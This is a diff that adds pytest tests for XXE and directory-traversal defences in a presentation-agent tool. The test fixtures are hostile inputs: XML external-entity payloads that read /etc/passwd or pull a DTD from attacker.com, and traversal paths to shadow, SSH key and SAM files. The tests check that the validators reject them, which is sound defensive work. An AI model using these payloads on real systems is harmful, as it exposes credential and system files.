@@ -1,9 +1,16 @@
 """Tests for security validation and prompt injection detection."""
 
+import tempfile
+from pathlib import Path
+
+import pytest
+
 from pptx_agent.validators.security import (
     SecurityValidationResult,
     detect_prompt_injection,
     sanitize_input,
+    validate_file_path,
+    validate_xml_safety,
 )
 
 
@@ -198,3 +205,205 @@ class TestSanitizationEdgeCases:
             assert result.sanitized_text[0].isupper() or not result.sanitized_text.strip(), (
                 f"Sanitized text is not properly capitalized: '{result.sanitized_text}'"
             )
+
+
+class TestXXEAttackPrevention:
+    """Tests for XXE (XML External Entity) attack prevention."""
+
+    def test_detect_external_entity_declaration(self):
+        """Should detect malicious XML external entity declarations."""
+        malicious_xml = """<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>"""
+        result = validate_xml_safety(malicious_xml)
+        assert result is False, "Failed to detect external entity declaration"
+
+    def test_detect_dtd_with_entity(self):
+        """Should detect DTD (Document Type Definition) with entity."""
+        malicious_xml = """<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY test "malicious">
+]>
+<root>&test;</root>"""
+        result = validate_xml_safety(malicious_xml)
+        assert result is False, "Failed to detect DTD with entity"
+
+    def test_detect_external_resource_reference(self):
+        """Should detect external resource references."""
+        malicious_xml = """<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">
+]>
+<root>&xxe;</root>"""
+        result = validate_xml_safety(malicious_xml)
+        assert result is False, "Failed to detect external resource reference"
+
+    def test_detect_parameter_entity(self):
+        """Should detect parameter entity expansion attack."""
+        malicious_xml = """<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+  %xxe;
+]>
+<root>test</root>"""
+        result = validate_xml_safety(malicious_xml)
+        assert result is False, "Failed to detect parameter entity"
+
+    def test_safe_xml_passes(self):
+        """Should allow safe XML without entities or DTD."""
+        safe_xml = """<?xml version="1.0"?>
+<root>
+  <element>Safe content</element>
+  <another>More safe content</another>
+</root>"""
+        result = validate_xml_safety(safe_xml)
+        assert result is True, "Safe XML was incorrectly flagged as malicious"
+
+    def test_safe_xml_with_namespace(self):
+        """Should allow safe XML with namespaces (common in PPTX files)."""
+        safe_xml = """<?xml version="1.0"?>
+<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
+  <p:cSld>
+    <p:spTree>
+      <p:sp>Safe content</p:sp>
+    </p:spTree>
+  </p:cSld>
+</p:sld>"""
+        result = validate_xml_safety(safe_xml)
+        assert result is True, "Safe XML with namespace was incorrectly flagged"
+
+    def test_safe_xml_with_cdata(self):
+        """Should allow safe XML with CDATA sections."""
+        safe_xml = """<?xml version="1.0"?>
+<root>
+  <![CDATA[This is safe CDATA content with <special> characters]]>
+</root>"""
+        result = validate_xml_safety(safe_xml)
+        assert result is True, "Safe XML with CDATA was incorrectly flagged"
+
+
+class TestDirectoryTraversalPrevention:
+    """Tests for directory traversal attack prevention."""
+
+    def test_detect_parent_directory_traversal(self):
+        """Should detect '../' path traversal attempts."""
+        malicious_paths = [
+            "../../../etc/passwd",
+            "templates/../../../sensitive.txt",
+            "data/../../../etc/shadow",
+            "./templates/../../outside.pptx",
+        ]
+        base_dir = "/safe/project/directory"
+
+        for path in malicious_paths:
+            result = validate_file_path(path, base_dir)
+            assert result is False, f"Failed to detect path traversal in: {path}"
+
+    def test_detect_absolute_path(self):
+        """Should detect absolute path attempts."""
+        malicious_paths = [
+            "/etc/passwd",
+            "/var/log/system.log",
+            "/home/user/.ssh/id_rsa",
+        ]
+        base_dir = "/safe/project/directory"
+
+        for path in malicious_paths:
+            result = validate_file_path(path, base_dir)
+            assert result is False, f"Failed to detect absolute path: {path}"
+
+    def test_detect_windows_absolute_path(self):
+        """Should detect Windows-style absolute paths."""
+        malicious_paths = [
+            "C:\\Windows\\System32\\config\\sam",
+            "D:\\sensitive\\data.txt",
+            "\\\\network\\share\\secret.doc",
+        ]
+        base_dir = "C:\\safe\\project"
+
+        for path in malicious_paths:
+            result = validate_file_path(path, base_dir)
+            assert result is False, f"Failed to detect Windows absolute path: {path}"
+
+    def test_detect_access_outside_base_directory(self):
+        """Should detect attempts to access files outside base directory."""
+        base_dir = "/project/templates"
+        # This should normalize to outside the base directory
+        malicious_path = "/project/templates/../../../etc/passwd"
+
+        result = validate_file_path(malicious_path, base_dir)
+        assert result is False, "Failed to detect access outside base directory"
+
+    def test_safe_relative_paths_pass(self):
+        """Should allow safe relative paths within base directory."""
+        safe_paths = [
+            "templates/basic-template.pptx",
+            "./templates/advanced.pptx",
+            "data/output.pptx",
+            "subdir/file.txt",
+        ]
+        base_dir = "/safe/project/directory"
+
+        for path in safe_paths:
+            result = validate_file_path(path, base_dir)
+            assert result is True, f"Safe relative path was incorrectly flagged: {path}"
+
+    def test_safe_nested_paths_pass(self):
+        """Should allow safe nested paths within base directory."""
+        safe_paths = [
+            "templates/themes/corporate/template.pptx",
+            "data/2024/Q1/report.pptx",
+            "output/final/version2/presentation.pptx",
+        ]
+        base_dir = "/safe/project/directory"
+
+        for path in safe_paths:
+            result = validate_file_path(path, base_dir)
+            assert result is True, f"Safe nested path was incorrectly flagged: {path}"
+
+    def test_detect_symlink_in_path(self):
+        """Should detect symlinks in file path (if supported by OS)."""
+        with tempfile.TemporaryDirectory() as temp_dir:
+            temp_path = Path(temp_dir)
+            base_dir = str(temp_path)
+
+            # Create a regular file
+            target_file = temp_path / "target.txt"
+            target_file.write_text("safe content")
+
+            # Create a symlink to the file
+            symlink_file = temp_path / "symlink.txt"
+            try:
+                symlink_file.symlink_to(target_file)
+            except OSError:
+                # Skip test on systems that don't support symlinks
+                pytest.skip("Symlinks not supported on this system")
+
+            # Try to access via symlink
+            result = validate_file_path(str(symlink_file), base_dir)
+            assert result is False, "Failed to detect symlink in path"
+
+    def test_normalized_path_within_base(self):
+        """Should accept path that normalizes to within base directory."""
+        base_dir = "/project/templates"
+        # This path has ../ but normalizes to within base directory
+        safe_path = "/project/templates/subdir/../file.pptx"
+
+        # After normalization: /project/templates/file.pptx (within base)
+        result = validate_file_path(safe_path, base_dir)
+        assert result is True, "Safe normalized path was incorrectly flagged"
+
+    def test_url_encoded_traversal_attempt(self):
+        """Should detect URL-encoded directory traversal attempts."""
+        malicious_paths = [
+            "..%2f..%2f..%2fetc%2fpasswd",
+            "templates%2f..%2f..%2fsensitive.txt",
+        ]
+        base_dir = "/safe/project/directory"
+
+        for path in malicious_paths:
+            result = validate_file_path(path, base_dir)
+            # After URL decoding, these should be detected as traversal
+            assert result is False, f"Failed to detect URL-encoded traversal: {path}"
